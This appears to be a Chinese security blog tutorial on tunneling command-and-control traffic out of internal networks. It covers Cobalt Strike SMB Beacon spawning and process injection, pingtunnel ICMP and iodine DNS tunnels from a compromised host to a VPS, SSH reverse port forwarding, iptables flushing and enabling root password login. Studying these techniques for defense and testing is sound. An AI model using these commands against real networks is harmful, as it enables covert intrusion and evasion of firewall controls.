# 原创
：  【内网安全-隧道技术】SMB、ICMP、DNS隧道、SSH协议

# 【内网安全-隧道技术】SMB、ICMP、DNS隧道、SSH协议

 <img alt="" src="https://img-blog.csdnimg.cn/2e86bda3ff034c71920f2f40732c3929.gif"/>

## 前言：

> 
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/c2dfbe518f7d43a2978e4e6f1bfd5ea1.gif" width="24"/>介绍： </h3>
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>博主：网络安全领域狂热爱好者（承诺在CSDN永久无偿分享文章）。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>殊荣：CSDN网络安全领域优质创作者，2022年双十一业务安全保卫战-某厂第一名，某厂特邀数字业务安全研究员，edusrc高白帽，vulfocus、攻防世界等平台排名100+、高校漏洞证书、cnvd原创漏洞证书等。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>擅长：对于技术、工具、漏洞原理、黑产打击的研究。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>C站缘：C站的前辈，引领我度过了一个又一个技术的瓶颈期、迷茫期。
<hr/>
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：</h3>
<img alt="" height="23" src="https://img-blog.csdnimg.cn/b1b5426baac44b97b68428245cc35d77.png" width="23"/>面向读者：对于网络安全方面的学者。 
<img alt="" height="23" src="https://img-blog.csdnimg.cn/19ea593260b84ec8b836a336326fa0cc.png" width="23"/>本文知识点（读者自测）： 
（1）常用的上线方法（√）
（2）上线工具的使用（√）


### <img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：

> 
<h2> <img alt="" height="23" src="https://img-blog.csdnimg.cn/19e90c25b42d4b368c3c94da4b04afb0.png" width="23"/>让读者如虎添翼</h2>
<table border="1" cellpadding="1" cellspacing="1"><tbody>|内网博文|目标|状态
|[【内网安全-CS】Cobalt Strike启动运行&amp;上线方法&amp;插件](https://blog.csdn.net/qq_53079406/article/details/128371064)|学会cs的基本使用方法、以及插件|已发布
|[【内网安全-基础】基础知识、信息收集、工具](https://blog.csdn.net/qq_53079406/article/details/128292587)|基础知识、基础常规信息收集（命令、工具等）|已发布
|[【内网安全-防火墙】防火墙、协议、策略](https://blog.csdn.net/qq_53079406/article/details/128314938)|防护墙的基础知识、出入站策略等|已发布
|[【内网安全-通讯&amp;上线】通讯&amp;上线基础知识](https://blog.csdn.net/qq_53079406/article/details/128320574)|基础知识、通讯、上线、代理|已发布
|[【内网安全-隧道技术】SMB、ICMP、DNS隧道、SSH协议](https://blog.csdn.net/qq_53079406/article/details/128328429)|常用的上线方法、上线工具使用|已发布
|隧道搭建、穿透上线|2023将继续更新，敬请期待|——
|横向移动|2023将继续更新，敬请期待|——
|权限维持|2023将继续更新，敬请期待|——
|靶场练习|2023将继续更新，敬请期待|——
</tbody></table>


---


**目录**

[一、基础知识](#%E4%B8%80%E3%80%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86)

[二、隧道技术](#%E4%BA%8C%E3%80%81%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF)

[1、简介：](#1%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A)

[2、SMB隧道](#2%E3%80%81SMB%E9%9A%A7%E9%81%93)

[3、ICMP隧道](#3%E3%80%81ICMP%E9%9A%A7%E9%81%93)

[4、DNS隧道](#4%E3%80%81DNS%E9%9A%A7%E9%81%93)

[5、SSH协议](#5%E3%80%81SSH%E5%8D%8F%E8%AE%AE)

[6、控制上线-插件](#6%E3%80%81%E6%8E%A7%E5%88%B6%E4%B8%8A%E7%BA%BF-%E6%8F%92%E4%BB%B6)

---


> 
<h2>一、基础知识</h2>
[【内网安全-基础】基础知识、信息收集、工具<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.2.0/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M85B"/>https://blog.csdn.net/qq_53079406/article/details/128292587?spm=1001.2014.3001.5501](https://blog.csdn.net/qq_53079406/article/details/128292587?spm=1001.2014.3001.5501)[【内网安全-防火墙】防火墙、协议、策略<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.2.0/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M85B"/>https://blog.csdn.net/qq_53079406/article/details/128314938?spm=1001.2014.3001.5501](https://blog.csdn.net/qq_53079406/article/details/128314938?spm=1001.2014.3001.5501)[【内网安全-通讯&amp;上线】通讯&amp;上线基础知识<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.2.0/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M85B"/>https://blog.csdn.net/qq_53079406/article/details/128320574?spm=1001.2014.3001.5501](https://blog.csdn.net/qq_53079406/article/details/128320574?spm=1001.2014.3001.5501)


> 
<h2>二、隧道技术</h2>
<h3>1、简介：</h3>
1）是路由器把一种网络层协议封装到另一个协议中以跨过网络传送到另一个路由器的处理过程
————
2）隧道技术是一种数据包封装技术，它是将原始IP包（其报头包含原始发送者和最终目的地）封装在另一个数据包（称为封装的IP包）的数据净荷中进行传输
————
3）隧道技术上线：<br/> HTTP/S &amp; DNS &amp; SSH &amp; ICMP &amp; SMB &amp; 协议穿透等<br/> 除去SMB隧道外，其他隧道技术大部分针对的出站策略绕过（也就是最终传输的地方会转会原本的协议）
<hr/>
<h3>2、SMB隧道</h3>
1）SMB(全称是Server Message Block)是一个网络协议名，它能被用于Web连接和客户端与服务器之间的信息沟通
#判断：445端口
————
2）上线条件
1、目标主机（SMB Beacon）接受 445 端口连接（因此445端口成为判断能否使用的方法）<br/> 2、Beacon只能链接由同一个 CS生成的<br/> 3、具有管理员权限或管理员凭据
————
3）使用（工具cs）
1、创建SMB Beacon 监听器、生成木马
（用Windows可执行程序E，这里我试了试没用过的选项，stageless意为没有舞台）


<img alt="" height="135" src="https://img-blog.csdnimg.cn/1fa9993083a44044951005c840894452.png" width="193"/><br/> 2、派生会话SMB Beacon（右键选中HTTP监听器上线的主机，进入Beacon控制台，输入spawn加SMB Beacon的监听器名称）
（预计process为rundll32.exe的主机会派生会话）

 （结果：新产生一个process为beacon.exe的派生会话）
<br/> 3、注入进程上线SMB Beacon（将SMB Beacon注入到某个进程中；右键--目标--进程列表--Inject--选中Beacon）
（预计最后SMB Beacon，process会变为phpstudy的进程 ）

开了phpstudy做测试


 （结果新产生了一个process为beacon.exe的）<img alt="" height="592" src="https://img-blog.csdnimg.cn/0c97c7f8a549487ba476925769d233d1.png" width="1200"/>


<hr/>
<h3>3、ICMP隧道</h3>
1）ICMP隧道技术是一种数据包封装技术，它是将原始IP包封装在ICMP的数据净荷中进行传输（传到接收方的时候，再变回Tcp）
#判断：ping命令（ping命令waf、防火墙不屏蔽情况下可以穿透）
————
2）在ICMP通信协议中，通信双方不需要开放端口（ ping 命令）
————
3）ICMP协议项目：<br/> https://github.com/esrrhs/spp<br/> https://github.com/bdamele/icmpsh<br/> https://github.com/esrrhs/pingtunnel
————<br/> 4）使用：
VPS:<br/> ./pingtunnel -type server

（出现问题： ./ping 隧道: 拒绝许可）<br/> 肉鸡：<br/> 管理器运行（ICMP程序）<br/> pingtunnel.exe -type client -l 127.0.0.1:6666 -s 192.168.46.66 -t 192.168.46.66:7777 -tcp 1 -noprint 1 -nolog 1（此处，监听本地6666端口，并转发到指定ip的7777端口）<br/>  ——<br/> CS:<br/> 监听器1：127.0.0.1 6666<br/> 监听器2：192.168.46.66 7777<br/> 生成监听器1的Stager后门肉鸡执行
<hr/>

<h3>4、DNS隧道</h3>
1）DNS：为了访问互联网和内网资源，DNS提供域名解析服务，将域名和IP地址进行转换
————
2）DNS隧道是将其他协议的内容封装在DNS协议中，然后以DNS请求和响应包完成传输数据(通信)的技术。当前网络世界中的DNS是一项必不可少的服务，所以防火墙和入侵检测设备将很难做到完全过滤掉DNS流量<br/> #判断：nslookup dig
————
#工具：https://github.com/yarrick/iodine
iodine原理：通过TAP虚拟网卡，在服务端建立起一个局域网；在客户端，通过TAP建立一个虚拟网卡；两者通过DNS隧道连接，处于同一个局域网。在客户端和服务端之间建立连接后，客户机上会多出一块名为dns0的虚拟网卡
————
3）上线条件：
1、内网主机出网DNS协议数据<br/> 2、域名申请及配置<br/> 3、监听器创建及配置<br/> 4、后门绑定监听器及生成
————
4）上线：<br/> 1、内网主机出网DNS协议数据（解决通讯）<br/> 工具：https://github.com/yarrick/iodine<br/> 判断出网：nslookup www.baidu.com
——
2、服务器：设置密码并创建虚拟IP及绑定域名指向<br/> iodined -f -c -P 密码 192.168.0.1 ns1.域名 -DD<br/> 设置密码并创建虚拟IP及绑定域名指向
——
3、客户端：连接密码并绑定域名指向<br/> iodine -f -M 200 -P 密码 ns1.域名<br/> -尝试通讯尝试连接：<br/> ssh root@192.168.0.2
<hr/>
<h3>5、SSH协议</h3>
1）安全外壳协议（Secure Shell，简称SSH）是一种在不安全网络上用于安全远程登录和其他安全网络服务的协议
————
2）CS无SSH协议监听器配置，无法上线
————
3）通讯（SSH协议存在于Linux系统，跳板机必须Linux）：
<pre><code>iptables -F /* 清除所有规则 */
iptables -A INPUT -p tcp --dport 22 -j ACCEPT /*允许包从22端口进入*/
iptables -A OUTPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT /*允许从22端口进入的包返回*/
iptables -A OUTPUT -p udp --dport 53 -j ACCEPT /* 域名解析端口，一般不开 */
iptables -A INPUT -p udp --sport 53 -j ACCEPT /* 域名解析端口，一般不开 */
iptables -A INPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT /*允许本机访问本机*/
iptables -A OUTPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT
iptables -A INPUT -p tcp -s 0/0 --dport 80 -j ACCEPT /*允许所有IP访问80端口*/
iptables -A OUTPUT -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPT
iptables-save &gt; /etc/sysconfig/iptables /*保存配置*/
iptables -L /* 显示iptables列表 */

开启ssh协议登录：
vi /etc/ssh/sshd_config
PermitRootLogin yes
PasswordAuthentication yes
/etc/init.d/ssh start
/etc/init.d/ssh restart
本地：出站封
ssh -CfNg -L 1122:192.168.1.15:8080 root@192.168.1.166
curl http://127.0.0.1:1122
远程：入站封
ssh -CfNg -R 1234:192.168.1.15:8080 root@IP地址
curl http://127.0.0.1:1234
</code></pre>

<hr/>
<h3>6、控制上线-插件</h3>
https://github.com/gloxec/CrossC2
面向Linux Mac IOS Android系统上线支持
————
目前版本只支持反向的https和正向的tcp<br/> 1、下载对应版本加载器和CNA插件<br/> 2、上传加载器文件和本地加载CNA插件<br/> 3、修改CNA插件配置路径及上传Key文件<br/> 4、使用命令或插件绑定HTTPS监听器生成


### 2、SMB隧道

---


### 4、DNS隧道

---


### 6、控制上线-插件

---


---


> 
<h2><img alt="" height="28" src="https://img-blog.csdnimg.cn/0797a1b4a28e49479db240e038a7969d.png" width="28"/>网络安全三年之约</h2>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/0052aabacbb147b482912c9fe1950f56.png" width="23"/>First year </h3>
掌握各种原理、不断打新的靶场
<img alt="" height="23" src="https://img-blog.csdnimg.cn/6b308c9501174788aa24fa4e5ea8fdd2.png" width="23"/>目标：edusrc、cnvd 
[主页 | 教育漏洞报告平台 (sjtu.edu.cn)https://src.sjtu.edu.cn/](https://src.sjtu.edu.cn/)[https://www.cnvd.org.cnhttps://www.cnvd.org.cn/](https://www.cnvd.org.cn/)
<hr/>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/8439bb91fdfb4e739bacba4c96b9fb17.png" width="23"/>second year </h3>
不断学习、提升技术运用技巧，研究各种新平台
开始建立自己的渗透体系
<img alt="" height="23" src="https://img-blog.csdnimg.cn/3bc7983d3bac437fbcf8b3530e3ec8d3.png" width="23"/>目标：众测平台、企业src应急响应中心 
<table border="1" cellpadding="1" cellspacing="1"><tbody>|众测平台|URL
|漏洞盒子|[漏洞盒子 | 互联网安全测试众测平台](https://www.vulbox.com/)
|火线安全平台|[火线安全平台](https://www.huoxian.cn/)
|漏洞银行|[BUGBANK 官方网站 | 领先的网络安全漏洞发现品牌 | 开放安全的提出者与倡导者 | 创新的漏洞发现平台](https://www.bugbank.cn/)
|360漏洞众包响应平台|[360漏洞云漏洞众包响应平台](https://src.360.net/)
|补天平台（奇安信）|[补天 - 企业和白帽子共赢的漏洞响应平台，帮助企业建立SRC](https://www.butian.net/)
|春秋云测|[首页](https://zhongce.ichunqiu.com/)
|雷神众测（可信众测，安恒）|[雷神众测 - BountyTeam](https://www.bountyteam.com/)
|云众可信（启明星辰）|[云众可信 - 互联网安全服务引领者](https://www.cloudcrowd.com.cn/)
|ALLSEC|[ALLSEC](https://i.allsec.cn/#/)
|360众测|[360众测平台](https://zhongce.360.cn/)
|看雪众测（物联网）|[https://ce.kanxue.com/](https://ce.kanxue.com/)
|CNVD众测平台|[网络安全众测平台](https://zc.cnvd.org.cn/)
|工控互联网安全测试平台|[CNCERT工业互联网安全测试平台](https://test.ics-cert.org.cn/)
|慢雾（区块链）|[Submit Bug Bounty - SlowMist Zone - Blockchain Ecosystem Security Zone](https://slowmist.io/bug-bounty.html)
|平安汇聚|[http://isrc.pingan.com/homePage/index](http://isrc.pingan.com/homePage/index)
</tbody></table>


<table border="1" cellpadding="1" cellspacing="1"><tbody>|互联网大厂|URL
|阿里|https://asrc.alibaba.com/#/
|腾讯|https://security.tencent.com/
|百度|https://bsrc.baidu.com/v2/#/home
|美团|https://security.meituan.com/#/home
|360|https://security.360.cn/
|网易|https://aq.163.com/
|字节跳动|https://security.bytedance.com/
|京东|https://security.jd.com/#/
|新浪|http://sec.sina.com.cn/
|微博|https://wsrc.weibo.com/
|搜狗|http://sec.sogou.com/
|金山办公|https://security.wps.cn/
|有赞|https://src.youzan.com/
</tbody></table>

<hr/>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/18b63058b35848b19967730eb49fcb45.png" width="23"/>Third Year </h3>
学习最新的知识，建全自己的渗透体系
<img alt="" height="23" src="https://img-blog.csdnimg.cn/7ccb45a55d5244edad5a9a1fabc55f08.png" width="23"/>目标：参与护网（每一个男孩子心中的梦想） 
时间：一般5月面试，6/7月开始（持续2-3周）
分类：国家级护网、省级护网、市级护网、重大节日护网（如：建党、冬奥等）


### <img alt="" height="23" src="https://img-blog.csdnimg.cn/8439bb91fdfb4e739bacba4c96b9fb17.png" width="23"/>second year 

---

